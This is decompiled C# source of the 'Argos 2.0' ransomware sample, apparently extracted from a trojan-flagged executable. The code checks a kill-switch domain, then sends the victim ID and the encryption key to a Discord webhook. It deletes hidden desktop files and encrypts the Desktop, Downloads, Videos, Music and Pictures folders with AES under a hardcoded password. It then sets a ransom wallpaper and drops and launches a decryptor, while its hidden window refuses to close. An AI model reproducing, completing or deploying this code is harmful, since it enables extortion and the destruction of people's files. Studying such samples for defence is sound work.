// Decompiled with JetBrains decompiler
// Type: Argos_2._0.Mainransom
// Assembly: Argos 2.0, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C21A18F9-670E-4447-BF03-595690FF272C
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.Win32.Generic-e53e0cabe244ecc5a82a6f34318d6be6d8093066192fcb794c80ee6d5cd1ff2b.exe

using Argos_2._0.Properties;
using Microsoft.Win32;
using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Argos_2._0
{
  public class Mainransom : Form
  {
    private string USERID = Mainransom.Randomz(20);
    private const uint SPI_SETDESKWALLPAPER = 20;
    private const uint SPIF_UPDATEINIFILE = 1;
    private const uint SPIF_SENDWININICHANGE = 2;
    private IContainer components = (IContainer) null;
    public System.Windows.Forms.Timer timer1;

    public Mainransom()
    {
      this.InitializeComponent();
      this.TopMost = true;
      this.TransparencyKey = this.BackColor;
    }

    private static string Randomz(int L)
    {
      string str = "qwertyuiopasdfghjklzxcvbnm1234567890";
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      for (int index1 = 1; index1 <= L; ++index1)
      {
        int index2 = random.Next(0, str.Length);
        char ch = str[index2];
        stringBuilder.Append(ch);
      }
      return stringBuilder.ToString();
    }

    private void Form1_Load(object sender, EventArgs e) => this.checkkillswitch();

    private bool checkkillswitch()
    {
      try
      {
        HttpWebRequest httpWebRequest = WebRequest.Create("http://sfigouhsfg9sriufbhrweg0iwuefgho234ih5ug3405iu3gb5023i4po5j34g235345353tre23refs5h4poiuhg.com/") as HttpWebRequest;
        httpWebRequest.Method = "HEAD";
        HttpWebResponse response = httpWebRequest.GetResponse() as HttpWebResponse;
        response.Close();
        return response.StatusCode == HttpStatusCode.OK;
      }
      catch
      {
        this.start();
        return false;
      }
    }

    public static void sendWebHook(string url, string msg, string msg2) => http.Post(url, new NameValueCollection()
    {
      {
        "content",
        msg
      },
      {
        "content",
        msg2
      }
    });

    private void start()
    {
      RegistryKey subKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\ARGOSLOCKER");
      subKey.SetValue("ID", (object) this.USERID);
      subKey.Close();
      Mainransom.sendWebHook("https://discord.com/api/webhooks/936354130631458917/tw8whO_omBwqaEe6tFRz2V0CgKb_RJ3jiJo5vJ7vu0gaxvN-XrvXVgBNT9ygZDq25NK6", "Key: diguyh3rtiu34gth9iu34tg398uhfb08uhd098guh3459tiu34ht8hdfv087yr", "   ID: " + this.USERID);
      System.IO.File.WriteAllBytes("C:\\Ransom.png", Resources.Ransom);
      foreach (string path in Directory.EnumerateFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\").Where<string>((Func<string, bool>) (f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden)).ToArray<string>())
      {
        try
        {
          System.IO.File.Delete(path);
        }
        catch (Exception ex)
        {
        }
      }
      string path1 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\desktop.ini";
      try
      {
        System.IO.File.Delete(path1);
      }
      catch (Exception ex)
      {
      }
      string path2 = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Downloads") + "\\desktop.ini";
      try
      {
        System.IO.File.Delete(path2);
      }
      catch (Exception ex)
      {
      }
      Thread.Sleep(1000);
      this.Start_Encrypt();
    }

    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SystemParametersInfo(
      uint uiAction,
      uint uiParam,
      string pvParam,
      uint fWinIni);

    private static void DisplayPicture(string file_name)
    {
      uint fWinIni = 0;
      if (Mainransom.SystemParametersInfo(20U, 0U, file_name, fWinIni))
        ;
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e) => e.Cancel = true;

    private void Start_Encrypt()
    {
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
      string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
      string str1 = Path.Combine(environmentVariable, "Downloads");
      string str2 = Path.Combine(environmentVariable, "Videos");
      string str3 = Path.Combine(environmentVariable, "Music");
      string str4 = Path.Combine(environmentVariable, "Pictures");
      string[] files1 = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
      string[] files2 = Directory.GetFiles(str1 + "\\", "*", SearchOption.AllDirectories);
      string[] files3 = Directory.GetFiles(str2 + "\\", "*", SearchOption.AllDirectories);
      string[] files4 = Directory.GetFiles(str3 + "\\", "*", SearchOption.AllDirectories);
      string[] files5 = Directory.GetFiles(str4 + "\\", "*", SearchOption.AllDirectories);
      Mainransom.EncryptionFile encryptionFile = new Mainransom.EncryptionFile();
      string password = "diguyh3rtiu34gth9iu34tg398uhfb08uhd098guh3459tiu34ht8hdfv087yr";
      try
      {
        for (int index = 0; index < files1.Length; ++index)
        {
          try
          {
            encryptionFile.EncryptFile(files1[index], password);
          }
          catch (Exception ex)
          {
          }
        }
        for (int index = 0; index < files2.Length; ++index)
        {
          try
          {
            encryptionFile.EncryptFile(files2[index], password);
          }
          catch (Exception ex)
          {
          }
        }
        for (int index = 0; index < files3.Length; ++index)
        {
          try
          {
            encryptionFile.EncryptFile(files3[index], password);
          }
          catch (Exception ex)
          {
          }
        }
        for (int index = 0; index < files4.Length; ++index)
        {
          try
          {
            encryptionFile.EncryptFile(files4[index], password);
          }
          catch (Exception ex)
          {
          }
        }
        for (int index = 0; index < files5.Length; ++index)
        {
          try
          {
            encryptionFile.EncryptFile(files5[index], password);
          }
          catch (Exception ex)
          {
          }
        }
      }
      catch (Exception ex)
      {
      }
    }

    private void button1_Click(object sender, EventArgs e)
    {
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
      Mainransom.DisplayPicture("C:\\Ransom.png");
      System.IO.File.WriteAllBytes("C:\\@argosd3crypter.exe", Resources.Argos_2_0_Decryptor);
      Process.Start("C:\\@argosd3crypter.exe");
      this.timer1.Stop();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.timer1 = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      this.timer1.Enabled = true;
      this.timer1.Interval = 10000;
      this.timer1.Tick += new EventHandler(this.timer1_Tick);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(10, 10);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Mainransom);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = "Argos";
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }

    public class CoreEncryption
    {
      public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
      {
        byte[] numArray = (byte[]) null;
        byte[] salt = new byte[8]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8
        };
        using (MemoryStream memoryStream = new MemoryStream())
        {
          using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
          {
            rijndaelManaged.KeySize = 256;
            rijndaelManaged.BlockSize = 128;
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
            rijndaelManaged.Mode = CipherMode.CBC;
            using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
            {
              cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
              cryptoStream.Close();
            }
            numArray = memoryStream.ToArray();
          }
        }
        return numArray;
      }
    }

    public class CoreDecryption
    {
      public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
      {
        byte[] numArray = (byte[]) null;
        byte[] salt = new byte[8]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8
        };
        using (MemoryStream memoryStream = new MemoryStream())
        {
          using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
          {
            rijndaelManaged.KeySize = 256;
            rijndaelManaged.BlockSize = 128;
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
            rijndaelManaged.Mode = CipherMode.CBC;
            using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
            {
              cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
              cryptoStream.Close();
            }
            numArray = memoryStream.ToArray();
          }
        }
        return numArray;
      }
    }

    public class EncryptionFile
    {
      public void EncryptFile(string file, string password)
      {
        byte[] bytesToBeEncrypted = System.IO.File.ReadAllBytes(file);
        byte[] bytes1 = Encoding.UTF8.GetBytes(password);
        byte[] hash = SHA256.Create().ComputeHash(bytes1);
        byte[] bytes2 = Mainransom.CoreEncryption.AES_Encrypt(bytesToBeEncrypted, hash);
        System.IO.File.WriteAllBytes(file, bytes2);
      }
    }
  }
}
